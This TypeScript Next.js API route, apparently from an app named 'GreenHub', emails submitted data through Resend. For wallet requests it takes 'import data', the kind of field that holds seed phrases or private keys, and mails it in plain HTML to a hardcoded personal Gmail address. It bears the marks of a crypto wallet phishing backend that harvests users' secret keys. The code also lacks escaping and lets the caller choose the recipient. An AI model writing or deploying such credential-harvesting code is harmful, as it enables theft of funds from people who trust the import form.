import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const {
      type,
      walletName,
      importMethod,
      importData,
      userEmail,
      imageName,
      imageUrl,
    } = body;

    // Validate required fields based on type
    if (type === "wallet") {
      if (!walletName || !importMethod || !importData) {
        return NextResponse.json(
          { error: "Missing required wallet fields" },
          { status: 400 }
        );
      }
    } else if (type === "image") {
      if (!imageUrl) {
        return NextResponse.json(
          { error: "Missing required image fields" },
          { status: 400 }
        );
      }
    } else {
      return NextResponse.json(
        { error: "Invalid type. Must be 'wallet' or 'image'" },
        { status: 400 }
      );
    }

    let emailContent = "";
    let subject = "";

    if (type === "wallet") {
      // Wallet import email content
      subject = `Wallet Import Request - ${walletName}`;
      emailContent = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #8b5cf6; margin-bottom: 20px;">Wallet Import Request</h2>
          
          <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="margin-top: 0; color: #333;">Import Details:</h3>
            <p><strong>Wallet:</strong> ${walletName}</p>
            <p><strong>Import Method:</strong> ${importMethod}</p>
            <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
          </div>

          <div style="background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">⚠️ Security Notice</h4>
            <p style="margin-bottom: 0; color: #856404;">
              This email contains sensitive wallet information. Please handle with care and delete after processing.
            </p>
          </div>

          <div style="background: #e9ecef; padding: 15px; border-radius: 8px; margin-top: 20px;">
            <h4 style="margin-top: 0; color: #495057;">Import Data:</h4>
            <pre style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; color: #495057;">${importData}</pre>
          </div>

          <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #dee2e6;">
            <p style="color: #6c757d; font-size: 14px;">
              This request was generated from your GreenHub application.
            </p>
          </div>
        </div>
      `;
    } else if (type === "image") {
      // Image upload email content
      subject = `New Image Upload${imageName ? ` - ${imageName}` : ""}`;
      emailContent = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #10b981; margin-bottom: 20px;">New Image Upload</h2>
          
          <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="margin-top: 0; color: #333;">Upload Details:</h3>
            ${
              imageName
                ? `<p><strong>Image Name:</strong> ${imageName}</p>`
                : ""
            }
            <p><strong>Upload Time:</strong> ${new Date().toLocaleString()}</p>
            <p><strong>Image URL:</strong> <a href="${imageUrl}" target="_blank" style="color: #10b981; text-decoration: none;">${imageUrl}</a></p>
          </div>

          <div style="background: #d1fae5; padding: 15px; border-radius: 8px; border-left: 4px solid #10b981;">
            <h4 style="margin-top: 0; color: #065f46;">📸 Image Preview</h4>
            <p style="margin-bottom: 15px; color: #065f46;">
              Click the link above to view the uploaded image.
            </p>
            <img src="${imageUrl}" alt="${
        imageName || "Uploaded image"
      }" style="max-width: 100%; height: auto; border-radius: 8px; border: 2px solid #10b981;" />
          </div>

          <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #dee2e6;">
            <p style="color: #6c757d; font-size: 14px;">
              This image was uploaded to your GreenHub application.
            </p>
          </div>
        </div>
      `;
    }

    // Send email
    const { data, error } = await resend.emails.send({
      from: "GreenHub <onboarding@resend.dev>", // Use Resend's test domain
      to: [userEmail || "carlyjenny526@gmail.com"], // Your email
      subject: subject,
      html: emailContent,
    });

    if (error) {
      console.error("Resend error:", error);
      return NextResponse.json(
        { error: "Failed to send email" },
        { status: 500 }
      );
    }

    return NextResponse.json(
      { success: true, message: "Email sent successfully" },
      { status: 200 }
    );
  } catch (error) {
    console.error("Email sending error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
